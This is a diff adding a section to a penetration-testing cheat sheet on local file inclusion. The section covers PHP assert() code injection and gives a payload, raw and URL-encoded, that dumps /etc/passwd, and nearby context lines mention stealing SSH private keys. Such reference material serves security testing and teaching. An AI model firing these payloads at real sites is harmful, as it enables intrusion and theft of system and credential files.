@@ -401,6 +401,26 @@ Then crack the hashes inside in order to login via SSH on the machine.
 Another way to gain SSH access to a Linux machine through LFI is by reading the private key file, id_rsa.
 If SSH is active check which user is being used `/proc/self/status` and `/etc/passwd` and try to access `/<HOME>/.ssh/id_rsa`.
 
+### LFI When assert() Is Present (PHP Injection)
+There are two cases when an assert() by be present for you to abuse. 
+
+1. If you attempt an LFI and are returned an error message that seems to be resulting for a bad assert such as the following example:
+```
+Application Reply with message “Warning: assert(): Assertion “strpos(‘includes/’, ‘qwer’) === false && strlen(file_get_contents(“.passwd”)) == 0 && strpos(‘1.php’, ‘..’) === false” failed in /var/www/html/index.php on line 8”
+```
+2. Or if you receive custom message that might be purposefully stopping an LFI from working like:
+```Detected hacking attempt!```
+
+If you can determine that a php assert() is being used to here to detect and stop the LFI, then it may susceptible  to a PHP code injection. One way to test this is to observe the behavior of the returned page if you type a `'` or a `"` into the LFI payload. If this results in a mismatched quote error, or if you don't get the custom error you have been seeing, then this could be vulnerable to a PHP code injection attack. An example payload is: 
+```
+' and die(show_source('/etc/passwd')) or '
+```
+This would likely need to be URL encoded:
+```
+http://example.com/index.php?page=%27%20and%20die(show_source(%27%2Fetc%2Fpasswd%27))%20or%20%27
+```
+
+
 ## References
 
 * [OWASP LFI](https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion)
@@ -417,3 +437,4 @@ If SSH is active check which user is being used `/proc/self/status` and `/etc/pa
 * [It's-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It, Sam Thomas](https://github.com/s-n-t/presentations/blob/master/us-18-Thomas-It's-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It.pdf)
 * [CVV #1: Local File Inclusion - @SI9INT - Jun 20, 2018](https://medium.com/bugbountywriteup/cvv-1-local-file-inclusion-ebc48e0e479a)
 * [Exploiting Remote File Inclusion (RFI) in PHP application and bypassing remote URL inclusion restriction](http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html?m=1)
+* [PHP ASSERT() VULNERABLE TO LOCAL FILE INCLUSION](https://hydrasky.com/network-security/php-assert-vulnerable-to-local-file-inclusion/)
